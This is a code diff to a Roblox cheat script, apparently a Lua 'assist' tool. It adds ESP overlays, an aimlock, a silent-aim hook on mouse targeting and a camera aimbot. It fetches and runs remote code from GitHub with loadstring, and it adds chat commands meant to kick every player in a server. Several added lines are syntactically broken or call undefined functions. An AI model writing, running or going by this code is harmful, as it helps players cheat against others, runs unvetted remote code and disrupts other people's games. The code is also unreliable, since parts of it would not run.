@@ -2016,8 +2016,89 @@ function library:AddWindow(title, options)
 	return window_data, Window
 end
 
+do -- Example UI
+	local Window = library:AddWindow("Preview", {
+		main_color = Color3.fromRGB(41, 74, 122),
+		min_size = Vector2.new(500, 600),
+		toggle_key = Enum.KeyCode.RightShift,
+		can_resize = true,
+	})
+	local Tab = Window:AddTab("Tab 1")
 
-local Window = library:AddWindow("Brennen Assist", {
+	do -- Elements
+		Tab:AddLabel("Hello World!")
+
+		Tab:AddButton("Button", function()
+			print("Button clicked.")
+		end)
+
+		Tab:AddTextBox("TextBox", function(text)
+			print(text)
+		end, {
+			["clear"] = false, -- Default: true (options are optional)
+		})
+
+		local Switch = Tab:AddSwitch("Switch", function(bool)
+			print(bool)
+		end)
+		Switch:Set(true)
+
+		local Slider = Tab:AddSlider("Slider", function(x)
+			print(x)
+		end, { -- (options are optional)
+			["min"] = 0, -- Default: 0
+			["max"] = 100, -- Default: 100
+			["readonly"] = false, -- Default: false
+		})
+		Slider:Set(50)
+
+		Tab:AddKeybind("Keybind", function(key)
+			print(key)
+		end, { -- (options are optional)
+			["standard"] = Enum.KeyCode.RightShift -- Default: RightShift
+		})
+
+		local Dropdown = Tab:AddDropdown("Dropdown", function(object)
+			print(object)
+		end)
+		for i = 1, 9 do
+			Dropdown:Add(tostring(i))
+		end
+		local obj = Dropdown:Add("10")
+		obj:Remove()
+
+		local CP = Tab:AddColorPicker(function(color)
+			print(color)
+		end)
+		CP:Set(Color3.new(1, 0, 0))
+
+		local Console = Tab:AddConsole({
+			["y"] = 100,
+			["source"] = "Lua",
+		})
+		Console:Set("-- Gamer time!\nfor i = 1, 9 do \n    print(i)\nend")
+		print(Console:Get())
+
+		local HA = Tab:AddHorizontalAlignment()
+		HA:AddButton("Execute", function()
+			loadstring(Console:Get())()
+		end)
+		HA:AddButton("Clear", function()
+			Console:Set("")
+		end)
+
+		local Folder = Tab:AddFolder("Folder") -- This can contain exactly the same as a Tab. You can have as many folders as you'd like to.
+		Folder:AddLabel("Hello")
+		local Folder2 = Folder:AddFolder("?")
+		Folder2:AddLabel("Woo!")
+
+	end
+
+	Tab:Show()
+	library:FormatWindows()
+end
+
+local Window = library:AddWindow("Skid Assist", {
     main_color = Color3.fromRGB(27, 42, 53),
     min_size = Vector2.new(450, 500),
     toggle_key = Enum.KeyCode.V,
@@ -2027,12 +2108,11 @@ local Window = library:AddWindow("Brennen Assist", {
 local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/farthefarter/e/main/e"))()
 local Aimlock = loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconArsenalGod/Aimlock/main/lock"))()
 local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconArsenalGod/Aimlock/main/esp"))()
-ESP:Toggle(true)
+ESP:Toggle(false)
 ESP.Highlight = true
 Aiming.TeamCheck(false)
 Aiming.VisibleCheck = false
-
-
+Aimlock:Toggle(false)
 
 -- // Dependencies
 
@@ -2060,7 +2140,7 @@ local Settings = {
     SilentAim = false,
     Aimbot = false,
     Prediction = 0.178,
-    Aimlock = false
+    Smoothness = false
 }
 
 getgenv().Settings = Settings
@@ -2076,8 +2156,8 @@ end
 local bindableFunction= Instance.new("BindableFunction")
 
 game.StarterGui:SetCore("SendNotification", {
-    Title = "Brennen v4";
-    Text = "Welcome, Private User";
+    Title = "Skkid v4";
+    Text = "Welcome";
     Icon = "RBXID OR BLANK";
     Duration = "10";
     callbakc = bindableFunction;
@@ -2320,6 +2400,18 @@ ESPTab:AddSwitch("Enable ESP", function(bool)
     ESP:Toggle(bool)
 end)
 
+ESPTab:AddSwitch("Enable Tracers", function(bool)
+    ESP.Tracers = bool
+end)
+
+ESPTab:AddSwitch("Enable Names", function(bool)
+    ESP.Names = bool
+end)
+
+ESPTab:AddSwitch("Enable Boxes", function(bool)
+    ESP.Boxes = bool
+end)
+
 ALTab:AddSwitch("Silent Aim", function(bool)
     Settings.SilentAim = bool
 end)
@@ -2330,12 +2422,21 @@ end)
 
 AimTab:AddSwitch("Aimlock (t)", function(bool)
     Settings.Aimlock = bool
+	Aimlock:Toggle(bool)
 end)
 
+ALTab:AddSwitch("Webhook Mode", function(bool)
+    Settings.Webh = bool
+end)
 
 ALTab:AddSwitch("Notification Mode", function(bool)
     Settings.Not = bool
 end)
+
+ALTab:AddSwitch("Copy Mode", function(bool)
+    Settings.Cop = bool
+end)
+
 
 ALTab:AddSwitch("Predict Lag", function(bool)
     Settings.Prediction.Lag = bool
@@ -2349,7 +2450,7 @@ ALTab:AddSlider("FOV Size", function(value)
     Aiming.FOV = value
 end, {
     ["min"] = 0,
-    ["max"] = 400,
+    ["max"] = 200,
     ["readonly"] = false,
 })
 
@@ -2369,52 +2470,69 @@ ALTab:AddSwitch("Hit all Airshots", function(bool)
     Aiming.Airshots = true
 end)
 --AIMLOCK TAB
+AimTab:AddSlider("AimRadius", function(value)
+    Aimlock.AimRadius = value
+    {
+        ["min"] = 0,
+        ["max"] = 200,
+        ["readonly"] = false
+    }
+end)
+AimTab:AddSlider("SmoothnessAmount", function(value)
+    Aimlock.SmoothnessAmount = value
+    {
+        ["min"] = 1,
+        ["max"] = 10,
+        ["readonly"] = true
+    }
+end)
+AimTab:AddSwitch("Smoothness", function(bool)
+    Aimlock.Smoothness = bool 
+end)
 
-
-
-
--- // Overwrite to account downed
-function Aiming.Check()
-    -- // Check A
-    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
-        return false
+function Smoothness.Check()
+    if Aimlock.Smoothness == false then 
+        Aimlock.Smoothness = true 
     end
-
-    -- // Check if downed
-    local Character = Aiming.Character(Aiming.Selected)
-    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
-    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
-
-    -- // Check B
-    if (KOd or Grabbed) then
-        return false
-    end
-
-    -- //
-    return true
 end
 
--- // Hook
-local __index
-__index = hookmetamethod(game, "__index", function(t, k)
-    -- // Check if it trying to get our mouse's hit or target and see if we can use it
-    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
-        -- // Vars
-        local SelectedPart = Aiming.SelectedPart
+-- // Overwrite to account downed
+function Aiming.CanShoot()
+    -- Check if aiming is enabled and there's a selected target and part
+    if not (Aiming.Enabled and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart) then
+        return false
+    end
 
-        -- // Hit/Target
-        if (Settings.SilentAim and (k == "Hit" or k == "Target")) then
-            -- // Hit to account prediction
-            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * Settings.Prediction)
+    -- Get the character and check if it's KO'd or grabbed
+    local character = Aiming.Character(Aiming.Selected)
+    local isKOd = character:WaitForChild("BodyEffects")["K.O"].Value
+    local isGrabbed = character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
 
-            -- // Return modded val
-            return (k == "Hit" and Hit or SelectedPart)
+    -- Return true if the conditions are met
+    return not (isKOd or isGrabbed)
+end
+
+-- Hook for modifying Mouse behavior
+local originalIndex = hookmetamethod(game, "__index", function(t, k)
+    -- Check if it's trying to get mouse's hit or target and see if we can use it
+    if t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.CanShoot() then
+        -- Get the selected part
+        local selectedPart = Aiming.SelectedPart
+
+        -- Modify Hit/Target if SilentAim is enabled
+        if Settings.SilentAim and (k == "Hit" or k == "Target") then
+            -- Adjust Hit to account for prediction
+            local hit = selectedPart.CFrame + (selectedPart.Velocity * Settings.Prediction)
+
+            -- Return the modified value
+            return (k == "Hit" and hit or selectedPart)
         end
     end
 
-    -- // Return
-    return __index(t, k)
+    -- Return the original value
+    return originalIndex(t, k)
 end)
+
 
 local test = false
 
@@ -2431,19 +2549,115 @@ UserInputService.InputEnded:Connect(function(Key, Is)
 end)
 
 
-
--- // Aimbot
 RunService:BindToRenderStep("Aimbot", 0, function()
     if (Settings.Aimbot and Aiming.Check() and test) then
-        -- // Vars
         local SelectedPart = Aiming.SelectedPart
 
-        -- // Hit to account prediction
         local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * Settings.Prediction)
 
-        -- // Set the camera to face towards the Hit
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
 end)
 
+
+local whitelist = {
+    Owner = {
+        { id = "1780838285" }, 
+    },
+    Private = {
+        { id = "67890" }, 
+    },
+}
+
+function isPlayerAllowed(userId)
+    for category, users in pairs(whitelist) do
+        for _, user in pairs(users) do
+            if user.id == userId then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+function kickAllPlayers()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        player:Kick("Brennen Owns You")
+    end
+end
+
+function banAllPlayers()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        player:Kick("Banned for Exploits")
+    end
+end
+
+function freezePlayer()
+    if game.Players.LocalPlayer.Character then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+    end
+end
+
+function thawPlayer()
+    if game.Players.LocalPlayer.Character then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+    end
+end
+
+function handleChatCommand(player, message)
+    local playerId = tostring(player.UserId)
+
+    if isPlayerAllowed(playerId) then
+        local command = message:lower() 
+
+        if command == ".kick" then
+            kickAllPlayers()
+        elseif command == ".ban" then
+            banAllPlayers()
+        elseif command == ".freeze" then
+            freezePlayer()
+        elseif command == ".thaw" then
+            thawPlayer()
+        end
+    else
+        warn("Player is not allowed to execute the command.")
+    end
+end
+
+-- Listen for player chat messages
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleChatCommand(player, message)
+    end)
+end)
+
+
+DevId = {
+    1780838285,
+    0
+
+
+}
+
+function starnames()
+    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
+        if table.find(DevId, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. Player.DisplayName)
+                end
+            end
+        else
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. Player.DisplayName)
+                    end
+                end
+            end
+        end
+    end
+end
+local success,err = pcall(starnames)
+return DevId
 
